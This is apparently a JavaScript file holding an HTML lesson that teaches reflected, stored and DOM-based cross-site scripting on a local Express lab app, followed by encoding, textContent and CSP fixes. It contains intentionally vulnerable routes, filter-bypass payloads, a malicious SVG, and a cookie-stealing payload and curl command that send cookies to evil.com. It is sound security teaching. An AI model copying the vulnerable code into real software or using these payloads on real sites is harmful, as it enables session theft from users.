window.LESSONS = window.LESSONS || {};
window.LESSONS.xss = `

<h1 class="lesson-title">Lab 03: Cross-Site Scripting</h1>
<div class="lesson-subtitle">
  Lab 03 — The attacker does not break into your server. They make your server
  deliver their code to your users' browsers. Three variants, one devastating outcome.
</div>

<!-- ════════════════════════════════════════════ -->
<!-- PART A: Reflected XSS                       -->
<!-- ════════════════════════════════════════════ -->
<div class="step">
  <div class="step-label">Part A</div>
  <h3>Reflected XSS</h3>

  <p>
    Reflected XSS is the simplest variant to understand. The user sends input, the server
    includes that input in the response without sanitizing it, and the browser executes it.
    The payload "reflects" off the server back to the victim.
  </p>

  <p>
    Build a search endpoint that takes a query parameter and echoes it back:
  </p>

  <div class="code-block">
    <div class="code-header">
      <span class="code-file">routes/search.js</span>
      <button class="code-copy">copy</button>
    </div>
    <pre><code><span class="kw">const</span> express <span class="op">=</span> <span class="fn">require</span><span class="op">(</span><span class="str">'express'</span><span class="op">);</span>
<span class="kw">const</span> router  <span class="op">=</span> express.<span class="fn">Router</span><span class="op">();</span>

<span class="cmt">// VULNERABLE: user input goes directly into HTML response</span>
router.<span class="fn">get</span><span class="op">(</span><span class="str">'/search'</span><span class="op">,</span> <span class="op">(</span>req<span class="op">,</span> res<span class="op">)</span> <span class="kw">=&gt;</span> <span class="op">{</span>
  <span class="kw">const</span> q <span class="op">=</span> req<span class="op">.</span>query<span class="op">.</span>q <span class="op">||</span> <span class="str">''</span><span class="op">;</span>
  res.<span class="fn">send</span><span class="op">(</span><span class="str">\\\`
    &lt;h2&gt;Search Results&lt;/h2&gt;
    &lt;p&gt;You searched for: \\\${q}&lt;/p&gt;
    &lt;p&gt;No results found.&lt;/p&gt;
  \\\`</span><span class="op">);</span>
<span class="op">});</span>

module<span class="op">.</span>exports <span class="op">=</span> router<span class="op">;</span></code></pre>
  </div>

  <p>
    This looks harmless. It just shows the user what they searched for. But what happens
    when the search query contains HTML?
  </p>

  <div class="attack-box">
    <div class="attack-box-title">Reflected XSS Payload</div>
    <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>
    <p style="margin-top:12px;">
      URL: <code>http://localhost:3000/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>
    </p>
  </div>

  <p>
    The server builds the HTML response with the script tag inside it and sends it back.
    The browser receives this response and has absolutely no way to know which parts of the
    HTML came from your application's code and which parts came from the attacker's input.
    To the browser, it is all one HTML document. It parses the script tag, executes the
    JavaScript, and the attacker's code now runs with full access to the user's session
    on your domain.
  </p>

  <div class="code-block">
    <div class="code-header">
      <span class="code-file">Terminal — test with curl</span>
      <button class="code-copy">copy</button>
    </div>
    <pre><code>curl <span class="str">"http://localhost:3000/search?q=&lt;script&gt;alert(1)&lt;/script&gt;"</span></code></pre>
  </div>

  <p>
    In a real attack, the attacker does not type this URL into their own browser. They craft
    a link and send it to the victim — in an email, a chat message, a forum post. The victim
    clicks the link, and the script executes in the victim's browser, in the context of your
    application. The attacker can steal session cookies, redirect the user, modify the page
    content, or make API calls on the user's behalf.
  </p>

  <div class="callout warn">
    <div class="callout-title">The fundamental issue</div>
    <div class="callout-text">
      The browser cannot distinguish between legitimate HTML from your server and
      HTML injected by an attacker. Both arrive in the same HTTP response. Both get
      parsed and executed identically.
    </div>
  </div>
</div>

<!-- ════════════════════════════════════════════ -->
<!-- PART B: Stored XSS                          -->
<!-- ════════════════════════════════════════════ -->
<div class="step">
  <div class="step-label">Part B</div>
  <h3>Stored XSS</h3>

  <p>
    Stored XSS is reflected XSS on steroids. Instead of the payload living in a URL that
    the victim has to click, it gets saved in your database. Every user who views the page
    triggers the payload. No special link required.
  </p>

  <p>
    Build a simple comment system that stores raw user input:
  </p>

  <div class="code-block">
    <div class="code-header">
      <span class="code-file">routes/comments.js</span>
      <button class="code-copy">copy</button>
    </div>
    <pre><code><span class="kw">const</span> express <span class="op">=</span> <span class="fn">require</span><span class="op">(</span><span class="str">'express'</span><span class="op">);</span>
<span class="kw">const</span> router  <span class="op">=</span> express.<span class="fn">Router</span><span class="op">();</span>
<span class="kw">const</span> db      <span class="op">=</span> <span class="fn">require</span><span class="op">(</span><span class="str">'../db'</span><span class="op">);</span>

<span class="cmt">// POST a new comment (stores raw HTML)</span>
router.<span class="fn">post</span><span class="op">(</span><span class="str">'/comments'</span><span class="op">,</span> <span class="op">(</span>req<span class="op">,</span> res<span class="op">)</span> <span class="kw">=&gt;</span> <span class="op">{</span>
  <span class="kw">const</span> <span class="op">{</span> body <span class="op">}</span> <span class="op">=</span> req<span class="op">.</span>body<span class="op">;</span>
  db.<span class="fn">prepare</span><span class="op">(</span><span class="str">'INSERT INTO comments (body) VALUES (?)'</span><span class="op">).</span><span class="fn">run</span><span class="op">(</span>body<span class="op">);</span>
  res.<span class="fn">redirect</span><span class="op">(</span><span class="str">'/posts'</span><span class="op">);</span>
<span class="op">});</span>

<span class="cmt">// GET all comments — renders raw HTML from the database</span>
router.<span class="fn">get</span><span class="op">(</span><span class="str">'/posts'</span><span class="op">,</span> <span class="op">(</span>req<span class="op">,</span> res<span class="op">)</span> <span class="kw">=&gt;</span> <span class="op">{</span>
  <span class="kw">const</span> comments <span class="op">=</span> db.<span class="fn">prepare</span><span class="op">(</span><span class="str">'SELECT * FROM comments'</span><span class="op">).</span><span class="fn">all</span><span class="op">();</span>
  <span class="kw">let</span> html <span class="op">=</span> <span class="str">'&lt;h2&gt;Comments&lt;/h2&gt;'</span><span class="op">;</span>
  comments.<span class="fn">forEach</span><span class="op">(</span>c <span class="kw">=&gt;</span> <span class="op">{</span>
    html <span class="op">+=</span> <span class="str">\\\`&lt;div class="comment"&gt;\\\${c.body}&lt;/div&gt;\\\`</span><span class="op">;</span>
  <span class="op">});</span>
  res.<span class="fn">send</span><span class="op">(</span>html<span class="op">);</span>
<span class="op">});</span></code></pre>
  </div>

  <p>
    Notice that the SQL query itself uses parameterized queries — so there is no SQL injection
    here. The database safely stores whatever the user typed. The problem is what happens
    when that stored content gets rendered as HTML.
  </p>

  <div class="attack-box">
    <div class="attack-box-title">Stored XSS — Cookie Theft Payload</div>
    <code>&lt;img src=x onerror="fetch('http://evil.com/steal?c='+document.cookie)"&gt;</code>
  </div>

  <p>
    The attacker posts this as a comment. The <code>img</code> tag tries to load an image
    from the URL <code>x</code>, which fails. The <code>onerror</code> event handler fires,
    executing JavaScript that sends the victim's cookies to the attacker's server. Every
    single user who views the comments page triggers this.
  </p>

  <div class="code-block">
    <div class="code-header">
      <span class="code-file">Terminal — post the malicious comment</span>
      <button class="code-copy">copy</button>
    </div>
    <pre><code>curl -X POST http://localhost:3000/comments \\
  -H <span class="str">"Content-Type: application/x-www-form-urlencoded"</span> \\
  -d <span class="str">'body=&lt;img src=x onerror="fetch(&#39;http://evil.com/steal?c=&#39;%2Bdocument.cookie)"&gt;'</span></code></pre>
  </div>

  <p>
    Think about the scale of this. If this is a popular forum or a product review page,
    thousands of users could be compromised from a single malicious comment. The attacker
    posts once and harvests session cookies continuously. This is why stored XSS is
    considered more severe than reflected XSS — it requires no social engineering to trigger.
  </p>

  <div class="callout warn">
    <div class="callout-title">Stored XSS is persistent</div>
    <div class="callout-text">
      The payload lives in your database. It executes every time the page is loaded, for
      every user, until someone manually removes it. If the compromised page is a high-traffic
      area like a home page or popular post, the blast radius is enormous.
    </div>
  </div>
</div>

<!-- ════════════════════════════════════════════ -->
<!-- PART C: DOM-Based XSS                       -->
<!-- ════════════════════════════════════════════ -->
<div class="step">
  <div class="step-label">Part C</div>
  <h3>DOM-Based XSS</h3>

  <p>
    DOM-based XSS is different from the other two variants in a fundamental way: the server
    never sees the payload. The vulnerability exists entirely in client-side JavaScript.
  </p>

  <p>
    Build a page with client-side JS that reads from the URL and writes to the DOM:
  </p>

  <div class="code-block">
    <div class="code-header">
      <span class="code-file">public/welcome.html</span>
      <button class="code-copy">copy</button>
    </div>
    <pre><code><span class="op">&lt;</span>h2<span class="op">&gt;</span>Welcome<span class="op">&lt;/</span>h2<span class="op">&gt;</span>
<span class="op">&lt;</span>div id<span class="op">=</span><span class="str">"greeting"</span><span class="op">&gt;&lt;/</span>div<span class="op">&gt;</span>

<span class="op">&lt;</span>script<span class="op">&gt;</span>
  <span class="cmt">// VULNERABLE: reads from URL, writes to innerHTML</span>
  <span class="kw">const</span> params <span class="op">=</span> <span class="kw">new</span> <span class="fn">URLSearchParams</span><span class="op">(</span>window<span class="op">.</span>location<span class="op">.</span>search<span class="op">);</span>
  <span class="kw">const</span> name <span class="op">=</span> params<span class="op">.</span><span class="fn">get</span><span class="op">(</span><span class="str">'name'</span><span class="op">);</span>
  <span class="kw">if</span> <span class="op">(</span>name<span class="op">)</span> <span class="op">{</span>
    document<span class="op">.</span><span class="fn">getElementById</span><span class="op">(</span><span class="str">'greeting'</span><span class="op">).</span>innerHTML <span class="op">=</span>
      <span class="str">'Hello, '</span> <span class="op">+</span> name <span class="op">+</span> <span class="str">'!'</span><span class="op">;</span>
  <span class="op">}</span>
<span class="op">&lt;/</span>script<span class="op">&gt;</span></code></pre>
  </div>

  <p>
    The JavaScript reads the <code>name</code> parameter from the URL and writes it to the
    page using <code>innerHTML</code>. The server just serves a static HTML file — it never
    processes the query string at all.
  </p>

  <div class="attack-box">
    <div class="attack-box-title">DOM-Based XSS Payload</div>
    <code>http://localhost:3000/welcome.html?name=&lt;img src=x onerror=alert(1)&gt;</code>
  </div>

  <p>
    When the browser loads this URL, the client-side JavaScript reads the <code>name</code>
    parameter and writes <code>&lt;img src=x onerror=alert(1)&gt;</code> into the DOM via
    <code>innerHTML</code>. The browser parses it as HTML, the image load fails, and the
    <code>onerror</code> handler executes.
  </p>

  <p>
    In DOM-based XSS terminology, the <strong>source</strong> is where the untrusted data
    comes from (<code>location.search</code>, <code>location.hash</code>,
    <code>document.referrer</code>, etc.) and the <strong>sink</strong> is the dangerous
    function that processes it (<code>innerHTML</code>, <code>document.write()</code>,
    <code>eval()</code>, etc.). The vulnerability exists whenever untrusted data flows
    from a source to a sink without sanitization.
  </p>

  <div class="callout info">
    <div class="callout-title">Server-side blind spot</div>
    <div class="callout-text">
      Traditional server-side security tools — WAFs, input validation middleware, output
      encoding in template engines — cannot catch DOM-based XSS because the payload never
      touches the server. The entire attack happens in the browser. You need client-side
      defenses and careful code review of your JavaScript.
    </div>
  </div>
</div>

<hr>

<!-- ════════════════════════════════════════════ -->
<!-- THE FIX — Multiple Layers                   -->
<!-- ════════════════════════════════════════════ -->
<div class="step">
  <div class="step-label">The Fix</div>
  <h3>Defense in Depth — Multiple Layers</h3>

  <p>
    Unlike SQL injection, where parameterized queries are the single definitive fix, XSS
    requires a layered defense. No single technique covers every context.
  </p>

  <h4>Layer 1: HTML Encoding</h4>

  <p>
    The most fundamental defense is encoding special HTML characters before inserting
    user input into HTML:
  </p>

  <div class="fix-box">
    <div class="fix-box-title">HTML Encoding Function</div>
    <div class="code-block">
      <div class="code-header">
        <span class="code-file">utils/encode.js</span>
        <button class="code-copy">copy</button>
      </div>
      <pre><code><span class="kw">function</span> <span class="fn">escapeHtml</span><span class="op">(</span>str<span class="op">)</span> <span class="op">{</span>
  <span class="kw">return</span> <span class="fn">String</span><span class="op">(</span>str<span class="op">)</span>
    <span class="op">.</span><span class="fn">replace</span><span class="op">(</span><span class="str">/&amp;/g</span><span class="op">,</span>  <span class="str">'&amp;amp;'</span><span class="op">)</span>
    <span class="op">.</span><span class="fn">replace</span><span class="op">(</span><span class="str">/&lt;/g</span><span class="op">,</span>  <span class="str">'&amp;lt;'</span><span class="op">)</span>
    <span class="op">.</span><span class="fn">replace</span><span class="op">(</span><span class="str">/&gt;/g</span><span class="op">,</span>  <span class="str">'&amp;gt;'</span><span class="op">)</span>
    <span class="op">.</span><span class="fn">replace</span><span class="op">(</span><span class="str">/"/g</span><span class="op">,</span>  <span class="str">'&amp;quot;'</span><span class="op">)</span>
    <span class="op">.</span><span class="fn">replace</span><span class="op">(</span><span class="str">/'/g</span><span class="op">,</span>  <span class="str">'&amp;#39;'</span><span class="op">);</span>
<span class="op">}</span></code></pre>
    </div>
  </div>

  <p>
    Now the search route becomes safe:
  </p>

  <div class="code-block">
    <div class="code-header">
      <span class="code-file">routes/search.js (fixed)</span>
      <button class="code-copy">copy</button>
    </div>
    <pre><code>router.<span class="fn">get</span><span class="op">(</span><span class="str">'/search'</span><span class="op">,</span> <span class="op">(</span>req<span class="op">,</span> res<span class="op">)</span> <span class="kw">=&gt;</span> <span class="op">{</span>
  <span class="kw">const</span> q <span class="op">=</span> <span class="fn">escapeHtml</span><span class="op">(</span>req<span class="op">.</span>query<span class="op">.</span>q <span class="op">||</span> <span class="str">''</span><span class="op">);</span>
  res.<span class="fn">send</span><span class="op">(</span><span class="str">\\\`
    &lt;h2&gt;Search Results&lt;/h2&gt;
    &lt;p&gt;You searched for: \\\${q}&lt;/p&gt;
    &lt;p&gt;No results found.&lt;/p&gt;
  \\\`</span><span class="op">);</span>
<span class="op">});</span></code></pre>
  </div>

  <p>
    The input <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> becomes
    <code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code> — the browser renders it as
    visible text, not executable HTML.
  </p>

  <h4>Layer 2: textContent Instead of innerHTML</h4>

  <p>
    For DOM-based XSS, the fix is straightforward: stop using <code>innerHTML</code> when
    you are inserting text.
  </p>

  <div class="fix-box">
    <div class="fix-box-title">Safe DOM Manipulation</div>
    <div class="code-block">
      <div class="code-header">
        <span class="code-file">public/welcome.html (fixed)</span>
        <button class="code-copy">copy</button>
      </div>
      <pre><code><span class="op">&lt;</span>script<span class="op">&gt;</span>
  <span class="kw">const</span> params <span class="op">=</span> <span class="kw">new</span> <span class="fn">URLSearchParams</span><span class="op">(</span>window<span class="op">.</span>location<span class="op">.</span>search<span class="op">);</span>
  <span class="kw">const</span> name <span class="op">=</span> params<span class="op">.</span><span class="fn">get</span><span class="op">(</span><span class="str">'name'</span><span class="op">);</span>
  <span class="kw">if</span> <span class="op">(</span>name<span class="op">)</span> <span class="op">{</span>
    <span class="cmt">// SAFE: textContent treats input as text, never as HTML</span>
    document<span class="op">.</span><span class="fn">getElementById</span><span class="op">(</span><span class="str">'greeting'</span><span class="op">).</span>textContent <span class="op">=</span>
      <span class="str">'Hello, '</span> <span class="op">+</span> name <span class="op">+</span> <span class="str">'!'</span><span class="op">;</span>
  <span class="op">}</span>
<span class="op">&lt;/</span>script<span class="op">&gt;</span></code></pre>
    </div>
  </div>

  <p>
    <code>textContent</code> inserts the string as a text node. The browser will never
    parse it as HTML. Even if the input contains <code>&lt;img onerror=...&gt;</code>,
    it is displayed as literal text on the page.
  </p>

  <h4>Layer 3: Content Security Policy (CSP)</h4>

  <p>
    Content Security Policy is a defense-in-depth mechanism. It does not prevent XSS
    vulnerabilities in your code — it limits what an attacker can do if they find one.
    You send a CSP header that tells the browser which scripts are allowed to execute.
  </p>

  <div class="code-block">
    <div class="code-header">
      <span class="code-file">middleware/csp.js — nonce-based CSP</span>
      <button class="code-copy">copy</button>
    </div>
    <pre><code><span class="kw">const</span> crypto <span class="op">=</span> <span class="fn">require</span><span class="op">(</span><span class="str">'crypto'</span><span class="op">);</span>

<span class="kw">function</span> <span class="fn">cspMiddleware</span><span class="op">(</span>req<span class="op">,</span> res<span class="op">,</span> next<span class="op">)</span> <span class="op">{</span>
  <span class="cmt">// Generate a unique nonce for each request</span>
  <span class="kw">const</span> nonce <span class="op">=</span> crypto.<span class="fn">randomBytes</span><span class="op">(</span><span class="num">16</span><span class="op">).</span><span class="fn">toString</span><span class="op">(</span><span class="str">'base64'</span><span class="op">);</span>
  res<span class="op">.</span>locals<span class="op">.</span>nonce <span class="op">=</span> nonce<span class="op">;</span>

  res.<span class="fn">setHeader</span><span class="op">(</span><span class="str">'Content-Security-Policy'</span><span class="op">,</span>
    <span class="str">\\\`default-src 'self'; script-src 'nonce-\\\${nonce}'; style-src 'self'\\\`</span>
  <span class="op">);</span>
  <span class="fn">next</span><span class="op">();</span>
<span class="op">}</span></code></pre>
  </div>

  <p>
    With this header, the browser will only execute script tags that carry the correct nonce
    attribute. Your legitimate scripts include the nonce; injected scripts do not.
  </p>

  <div class="code-block">
    <div class="code-header">
      <span class="code-file">In your EJS template</span>
      <button class="code-copy">copy</button>
    </div>
    <pre><code><span class="cmt">&lt;!-- This executes — it has the correct nonce --&gt;</span>
<span class="op">&lt;</span>script nonce<span class="op">=</span><span class="str">"&lt;%= nonce %&gt;"</span><span class="op">&gt;</span>
  console.<span class="fn">log</span><span class="op">(</span><span class="str">'legitimate script'</span><span class="op">);</span>
<span class="op">&lt;/</span>script<span class="op">&gt;</span>

<span class="cmt">&lt;!-- This is BLOCKED — no nonce, browser refuses to execute --&gt;</span>
<span class="op">&lt;</span>script<span class="op">&gt;</span>alert<span class="op">(</span><span class="str">'injected'</span><span class="op">)&lt;/</span>script<span class="op">&gt;</span></code></pre>
  </div>

  <div class="callout warn">
    <div class="callout-title">Do not use 'unsafe-inline'</div>
    <div class="callout-text">
      If your CSP includes <code>script-src 'unsafe-inline'</code>, you have effectively
      disabled the protection entirely. Inline scripts are exactly what XSS injects.
      Allowing unsafe-inline means your CSP does nothing against XSS. Use nonces or hashes
      instead.
    </div>
  </div>

  <h4>Context-Aware Escaping</h4>

  <p>
    One critical point that many developers miss: the correct escaping depends on where
    the user input appears. HTML encoding is not a universal solution. Different contexts
    need different encoding:
  </p>

  <table>
    <tr><th>Context</th><th>Example</th><th>Required Encoding</th></tr>
    <tr>
      <td>HTML body</td>
      <td><code>&lt;p&gt;USER_INPUT&lt;/p&gt;</code></td>
      <td>HTML entity encoding</td>
    </tr>
    <tr>
      <td>HTML attribute</td>
      <td><code>&lt;input value="USER_INPUT"&gt;</code></td>
      <td>HTML attribute encoding (encode quotes)</td>
    </tr>
    <tr>
      <td>JavaScript string</td>
      <td><code>var x = 'USER_INPUT';</code></td>
      <td>JavaScript string escaping</td>
    </tr>
    <tr>
      <td>URL parameter</td>
      <td><code>href="/page?q=USER_INPUT"</code></td>
      <td>URL encoding (encodeURIComponent)</td>
    </tr>
    <tr>
      <td>CSS value</td>
      <td><code>color: USER_INPUT;</code></td>
      <td>CSS encoding (or avoid entirely)</td>
    </tr>
  </table>

  <p>
    HTML encoding a value and then placing it inside a JavaScript string literal is not
    safe. The attacker can break out of the JS string without using any HTML characters.
    Always match the encoding to the output context.
  </p>
</div>

<hr>

<!-- ════════════════════════════════════════════ -->
<!-- DEEPER: Edge Cases                          -->
<!-- ════════════════════════════════════════════ -->
<h2>Deeper: Edge Cases That Bypass Naive Filters</h2>

<p>
  If you are thinking "I will just block <code>&lt;script&gt;</code> tags and I am safe" —
  you are not. There are dozens of ways to execute JavaScript without a script tag.
  Here are the ones you need to know about.
</p>

<h3>Event Handler Attributes</h3>

<p>
  Any HTML element that supports event handlers can execute JavaScript. Script tag
  filters do nothing against these:
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">Payloads that bypass script-tag filters</span>
    <button class="code-copy">copy</button>
  </div>
  <pre><code><span class="cmt">&lt;!-- onerror fires when image fails to load --&gt;</span>
<span class="str">&lt;img src=x onerror=alert(1)&gt;</span>

<span class="cmt">&lt;!-- onload fires when SVG loads --&gt;</span>
<span class="str">&lt;svg onload=alert(1)&gt;</span>

<span class="cmt">&lt;!-- onfocus fires when element receives focus --&gt;</span>
<span class="str">&lt;input onfocus=alert(1) autofocus&gt;</span>

<span class="cmt">&lt;!-- onmouseover fires on hover --&gt;</span>
<span class="str">&lt;div onmouseover=alert(1)&gt;hover me&lt;/div&gt;</span>

<span class="cmt">&lt;!-- body onload --&gt;</span>
<span class="str">&lt;body onload=alert(1)&gt;</span></code></pre>
</div>

<p>
  There are over 100 event handler attributes in HTML. Trying to maintain a blocklist
  of all of them is a losing battle. This is why output encoding is the correct
  approach — you neutralize the HTML syntax itself, not specific tag names.
</p>

<h3>SVG-Based XSS</h3>

<p>
  SVG is a particularly sneaky vector because it is an XML-based format that supports
  scripting. If your application accepts image uploads or allows SVG in user content:
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">Malicious SVG file</span>
    <button class="code-copy">copy</button>
  </div>
  <pre><code><span class="op">&lt;</span>svg xmlns<span class="op">=</span><span class="str">"http://www.w3.org/2000/svg"</span><span class="op">&gt;</span>
  <span class="op">&lt;</span>script<span class="op">&gt;</span>alert<span class="op">(</span>document<span class="op">.</span>cookie<span class="op">)&lt;/</span>script<span class="op">&gt;</span>
<span class="op">&lt;/</span>svg<span class="op">&gt;</span></code></pre>
</div>

<p>
  If this SVG is served with a content type that the browser renders (like
  <code>image/svg+xml</code>), and the user navigates to it directly, the script
  executes. If the SVG is embedded via an <code>&lt;img&gt;</code> tag, browsers
  will not execute the script. But if it is embedded via <code>&lt;object&gt;</code>,
  <code>&lt;embed&gt;</code>, or <code>&lt;iframe&gt;</code>, it will.
</p>

<h3>Mutation XSS (mXSS)</h3>

<p>
  This is one of the more advanced XSS techniques. The idea: you provide input that
  looks safe after sanitization, but when the browser's HTML parser processes it,
  the parser rewrites the DOM in a way that creates an XSS payload.
</p>

<p>
  Browsers are incredibly lenient HTML parsers. They will "fix" malformed HTML in
  unexpected ways. For example, some parsers will move content out of a
  <code>&lt;noscript&gt;</code> context into the active DOM when JavaScript is enabled,
  or rewrite nested elements in ways that create new attribute contexts. The input
  passes your server-side sanitizer, but the browser's parsing produces something
  different from what the sanitizer expected.
</p>

<div class="callout info">
  <div class="callout-title">Defense against mutation XSS</div>
  <div class="callout-text">
    The best defense is to use a well-maintained HTML sanitizer library like DOMPurify,
    which is specifically designed to handle parser quirks. Rolling your own HTML sanitizer
    with regex is almost guaranteed to miss mXSS edge cases. If you do not need to allow
    any HTML at all, stick with <code>textContent</code> or full entity encoding — these
    are immune to mXSS because they never parse the input as HTML.
  </div>
</div>

<hr>

<!-- ════════════════════════════════════════════ -->
<!-- THE DIFF                                    -->
<!-- ════════════════════════════════════════════ -->
<h2>Summary: The Diff</h2>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">routes/search.js</span>
    <button class="code-copy">copy</button>
  </div>
  <pre><code><div class="diff"><span class="diff-ctx">router.get('/search', (req, res) =&gt; {</span>
<span class="diff-rem">  const q = req.query.q || '';</span>
<span class="diff-add">  const q = escapeHtml(req.query.q || '');</span>
<span class="diff-ctx">  res.send(\\\`Search results for: \\\${q}\\\`);</span>
<span class="diff-ctx">});</span></div></code></pre>
</div>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">public/welcome.html</span>
    <button class="code-copy">copy</button>
  </div>
  <pre><code><div class="diff"><span class="diff-rem">document.getElementById('greeting').innerHTML = 'Hello, ' + name;</span>
<span class="diff-add">document.getElementById('greeting').textContent = 'Hello, ' + name;</span></div></code></pre>
</div>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">app.js — add CSP header</span>
    <button class="code-copy">copy</button>
  </div>
  <pre><code><div class="diff"><span class="diff-add">const nonce = crypto.randomBytes(16).toString('base64');</span>
<span class="diff-add">res.setHeader('Content-Security-Policy',</span>
<span class="diff-add">  \\\`default-src 'self'; script-src 'nonce-\\\${nonce}'\\\`);</span></div></code></pre>
</div>

<hr>

<!-- ════════════════════════════════════════════ -->
<!-- TASK CHECKLIST                              -->
<!-- ════════════════════════════════════════════ -->
<h2>Lab Checklist</h2>

<ul class="task-list">
  <li><span class="task-check"></span> Built the reflected XSS search endpoint</li>
  <li><span class="task-check"></span> Tested script injection via the search query parameter</li>
  <li><span class="task-check"></span> Built the stored XSS comment system</li>
  <li><span class="task-check"></span> Tested the cookie theft payload via img onerror</li>
  <li><span class="task-check"></span> Built the DOM-based XSS sink with innerHTML</li>
  <li><span class="task-check"></span> Applied all three fixes: HTML encoding, textContent, and CSP headers</li>
  <li><span class="task-check"></span> Verified that all three XSS types are blocked after the fixes</li>
</ul>

<!-- ════════════════════════════════════════════ -->
<!-- NAV                                         -->
<!-- ════════════════════════════════════════════ -->
<div class="section-nav">
  <button class="nav-btn" data-prev="sqli">Previous: SQL Injection</button>
  <button class="nav-btn" data-next="cmdi">Next: Command Injection</button>
</div>

`;
